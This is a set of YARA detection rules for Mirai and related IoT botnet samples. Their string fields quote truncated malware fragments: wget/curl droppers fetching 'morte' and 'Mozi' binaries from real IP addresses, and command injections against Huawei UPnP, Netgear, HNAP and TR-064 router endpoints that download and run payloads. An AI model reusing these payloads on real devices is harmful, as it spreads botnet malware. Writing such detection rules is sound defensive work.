/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-28
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

rule Mirai_signature__6cb72b6c {
   meta:
      description = "_subset_batch - file Mirai(signature)_6cb72b6c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6cb72b6c4398833bbadbf54349f8fcd5991a84df6616e73f33d2105989ba76c5"
   strings:
      $x1 = "[LOCKSH] KILLING shell process PID %s (Parent PID: %d, cmdline: %s)" fullword ascii /* score: '33.50'*/
      $s2 = "[LOCKSH] SKIPPING SSH process PID %s (Parent PID: %d)" fullword ascii /* score: '21.00'*/
      $s3 = "[CLEAN] KILLING PID %d (failed real path check)" fullword ascii /* score: '10.00'*/
      $s4 = "[CLEAN] SKIPPING SSH daemon PID %d at %s" fullword ascii /* score: '10.00'*/
      $s5 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__7f41b0b5 {
   meta:
      description = "_subset_batch - file Mirai(signature)_7f41b0b5.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7f41b0b5131b169605780c1bd5001e4386f1b8576edbdddb78ee96ed505cbb7d"
   strings:
      $s1 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__8499db38 {
   meta:
      description = "_subset_batch - file Mirai(signature)_8499db38.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8499db38a52efc4646eb70e5b1a1e6c4cdea4c4811bd255559303cc002ac3593"
   strings:
      $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '29.00'*/
      $s2 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s3 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s4 = "--login" fullword ascii /* score: '12.00'*/
      $s5 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__8882e526 {
   meta:
      description = "_subset_batch - file Mirai(signature)_8882e526.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8882e5268eb34afccc087326dd8715c9a6ccab0721a9d7431c0fa42302614ad7"
   strings:
      $x1 = "[LOCKSH] KILLING shell process PID %s (Parent PID: %d, cmdline: %s)" fullword ascii /* score: '33.50'*/
      $s2 = "[LOCKSH] SKIPPING SSH process PID %s (Parent PID: %d)" fullword ascii /* score: '21.00'*/
      $s3 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s4 = "[CLEAN] KILLING PID %d (failed real path check)" fullword ascii /* score: '10.00'*/
      $s5 = "[CLEAN] SKIPPING SSH daemon PID %d at %s" fullword ascii /* score: '10.00'*/
      $s6 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__89bd41c1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_89bd41c1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "89bd41c144b026ab5628d906917c5bb897e408d642ef6ff7e10beb9b34e9f620"
   strings:
      $s1 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__a6a1d08a {
   meta:
      description = "_subset_batch - file Mirai(signature)_a6a1d08a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a6a1d08a16b35a87f17af0423698792c1f1a8dc56f44c2fcb4565c3c1f830e19"
   strings:
      $s1 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 700KB and
      all of them
}

rule Mirai_signature__a974b7de {
   meta:
      description = "_subset_batch - file Mirai(signature)_a974b7de.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a974b7de7fff143231cceb4336d022192096f814e7512a7d246fef7235ccb606"
   strings:
      $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '29.00'*/
      $s2 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s3 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s4 = "--login" fullword ascii /* score: '12.00'*/
      $s5 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 800KB and
      all of them
}

rule Mirai_signature__9bad584a {
   meta:
      description = "_subset_batch - file Mirai(signature)_9bad584a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9bad584a9bcc3747c703d637720558a9f6389c636f7515c8e6cce8d31a91a8a2"
   strings:
      $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '29.00'*/
      $s2 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s3 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s4 = "--login" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 700KB and
      all of them
}

rule Mirai_signature__6ccd84ab {
   meta:
      description = "_subset_batch - file Mirai(signature)_6ccd84ab.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6ccd84ab817f8022f5f58d5473a0992f177064d4029d094b6fb7a5a2ed7469f2"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.arc; curl -O http://202.15" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.spc; curl -O http://202.15" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.ppc; curl -O http://202.15" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.arm; curl -O http://202.15" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.arm6; curl -O http://202.1" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.arm; curl -O http://202.15" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.i686; curl -O http://202.1" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.mpsl; curl -O http://202.1" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.spc; curl -O http://202.15" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.sh4; curl -O http://202.15" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.i468; curl -O http://202.1" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.x86; curl -O http://202.15" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.arm5; curl -O http://202.1" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.arc; curl -O http://202.15" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/00101010101001/morte.x86_64; curl -O http://202" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__7e7ffbbb {
   meta:
      description = "_subset_batch - file Mirai(signature)_7e7ffbbb.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7e7ffbbb1a029da5a7e688ced7ed352423d072109bfdc225af1f3de28fcf0a58"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.arc; curl -O http://2.57.19." ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.arm; curl -O http://2.57.19." ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.ppc; curl -O http://2.57.19." ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.spc; curl -O http://2.57.19." ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.arm6; curl -O http://2.57.19" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.m68k; curl -O http://2.57.19" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.mpsl; curl -O http://2.57.19" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.ppc; curl -O http://2.57.19." ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.arm7; curl -O http://2.57.19" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.arc; curl -O http://2.57.19." ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.x86_64; curl -O http://2.57." ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.i468; curl -O http://2.57.19" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.spc; curl -O http://2.57.19." ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.i686; curl -O http://2.57.19" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.19.247/00101010101001/morte.arm; curl -O http://2.57.19." ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__80e0751c {
   meta:
      description = "_subset_batch - file Mirai(signature)_80e0751c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "80e0751c0f9be4d908b5c5559d1b825bc82d9c277cb681e086d66f37da519641"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.arm; curl -O http://161.1" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.arc; curl -O http://161.1" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.spc; curl -O http://161.1" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.ppc; curl -O http://161.1" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.i468; curl -O http://161." ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.arm5; curl -O http://161." ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.mpsl; curl -O http://161." ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.arm6; curl -O http://161." ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.arc; curl -O http://161.1" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.spc; curl -O http://161.1" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.arm7; curl -O http://161." ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.m68k; curl -O http://161." ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.ppc; curl -O http://161.1" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.i686; curl -O http://161." ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.118.178.48/00101010101001/morte.sh4; curl -O http://161.1" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__98247dcc {
   meta:
      description = "_subset_batch - file Mirai(signature)_98247dcc.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "98247dcc1720e638eaa118a1b71e792283359d45a9204f01e3811b379a80d7cb"
   strings:
      $s1 = "                <value>rm -rf morte.mips; curl --output morte.mips http://41.216.189.108/00101010101001/morte.mips; wget http://" ascii /* score: '19.00'*/
      $s2 = "                <value>rm -rf morte.mips; curl --output morte.mips http://41.216.189.108/00101010101001/morte.mips; wget http://" ascii /* score: '16.00'*/
      $s3 = "<beans xmlns=\"http://www.springframework.org/schema/beans\"" fullword ascii /* score: '13.00'*/
      $s4 = "41.216.189.108/00101010101001/morte.mips; chmod 777morte.mips; ./morte.mips morte.mips;</value>" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x623c and filesize < 2KB and
      all of them
}

rule Mirai_signature__91c13a2a {
   meta:
      description = "_subset_batch - file Mirai(signature)_91c13a2a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "91c13a2a594fbc50a415169198d2c504f3c0179bc373f393debd1d2ae01b2495"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '44.50'*/
      $x2 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope//\" s:encodingStyle=\"http://schemas.xmls" ascii /* score: '44.50'*/
      $x3 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '43.50'*/
      $x4 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://%s:%d/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi" ascii /* score: '38.50'*/
      $x5 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://%s:%d/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi" ascii /* score: '38.50'*/
      $x6 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"" ascii /* score: '37.50'*/
      $x7 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"htt" ascii /* score: '34.00'*/
      $x8 = "iption><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://%s:%d/Mo" ascii /* score: '33.50'*/
      $x9 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii /* score: '33.50'*/
      $x10 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii /* score: '33.50'*/
      $x11 = "ver1>`cd /tmp && rm -rf * && /bin/busybox wget http://%s:%d/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><" ascii /* score: '31.50'*/
      $x12 = "orks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMapp" ascii /* score: '31.00'*/
      $x13 = ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/va" ascii /* score: '30.50'*/
      $x14 = ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/va" ascii /* score: '30.50'*/
      $s15 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://%s:%d/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron" fullword ascii /* score: '29.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 900KB and
      1 of ($x*)
}

rule Mirai_signature__710b1468 {
   meta:
      description = "_subset_batch - file Mirai(signature)_710b1468.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "710b14686ffa4aac63e5a387b43bb2a29610dda54ed96e6159be203511bab0f8"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "auth.binaries.lol" fullword ascii /* score: '16.00'*/
      $s4 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s6 = "botkill" fullword ascii /* score: '8.00'*/
      $s7 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s8 = "killattk" fullword ascii /* score: '8.00'*/
      $s9 = "htndhfg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__73d18423 {
   meta:
      description = "_subset_batch - file Mirai(signature)_73d18423.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "73d18423ceb3c19bb988eb22f9b1324ddc788f3de0dad8a2edab5ad2db704542"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s5 = "botkill" fullword ascii /* score: '8.00'*/
      $s6 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s7 = "killattk" fullword ascii /* score: '8.00'*/
      $s8 = "htndhfg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__79ab00ea {
   meta:
      description = "_subset_batch - file Mirai(signature)_79ab00ea.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "79ab00eaca3d3f20ac7b98caffbfd00a24242a334e434d11336f027d06c57b5a"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "auth.binaries.lol" fullword ascii /* score: '16.00'*/
      $s4 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s6 = "botkill" fullword ascii /* score: '8.00'*/
      $s7 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s8 = "killattk" fullword ascii /* score: '8.00'*/
      $s9 = "htndhfg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__7dd2f9c2 {
   meta:
      description = "_subset_batch - file Mirai(signature)_7dd2f9c2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7dd2f9c2f034c2c30bb12dea4331a941d5baba932651bf24c834e1d65762e0ad"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s5 = "botkill" fullword ascii /* score: '8.00'*/
      $s6 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s7 = "killattk" fullword ascii /* score: '8.00'*/
      $s8 = "htndhfg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__80ac781d {
   meta:
      description = "_subset_batch - file Mirai(signature)_80ac781d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "80ac781d9e562b8caf044835f9615970aac84221bf94d0de02ea779fd9644e08"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__8f289fd1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_8f289fd1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8f289fd157255d0d46c44c47dd6de6b0d0b46cfdef83426072a475ac699bb1e6"
   strings:
      $s1 = "N^NuPOST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__a2a8c1d6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a2a8c1d6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a2a8c1d61d760b9e5270229212ad8775ede1d8071b357eab6b465ecce62a90e7"
   strings:
      $s1 = "/home/process/" fullword ascii /* score: '15.00'*/
      $s2 = "Killed process: " fullword ascii /* score: '15.00'*/
      $s3 = "/usr/libexec/" fullword ascii /* score: '12.00'*/
      $s4 = "/system/system/bin/" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__6de39298 {
   meta:
      description = "_subset_batch - file Mirai(signature)_6de39298.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6de3929801e105fe9a462e354efe4d63a203434bad03a16c6a37378a77b23a3c"
   strings:
      $s1 = "WantedBy=multi-user.target" fullword ascii /* score: '17.00'*/
      $s2 = "getchal" fullword ascii /* score: '13.00'*/
      $s3 = "/tmp/rc.local.tmp" fullword ascii /* score: '13.00'*/
      $s4 = "(crontab -l 2>/dev/null; echo \"" fullword ascii /* score: '12.00'*/
      $s5 = "\") | crontab - >/dev/null 2>&1" fullword ascii /* score: '12.00'*/
      $s6 = "Dbad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
      $s7 = "systemctl start " fullword ascii /* score: '9.00'*/
      $s8 = "systemctl enable " fullword ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 Chrome/91.0.4472.120 Mobile Safari/537.36" fullword ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s11 = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule Mirai_signature__915de6ee {
   meta:
      description = "_subset_batch - file Mirai(signature)_915de6ee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "915de6eec0583ecdfdb7dbaf52d65b92f817d876b32c1b895cba40db753b95a3"
   strings:
      $s1 = "(diicot/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(diicot/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "X__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s4 = "vlbad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__ae944c73 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ae944c73.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ae944c7310a078b220d65582fea6b904c3cdee1c9c5e027232816d73b55c57b6"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "GET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s5 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
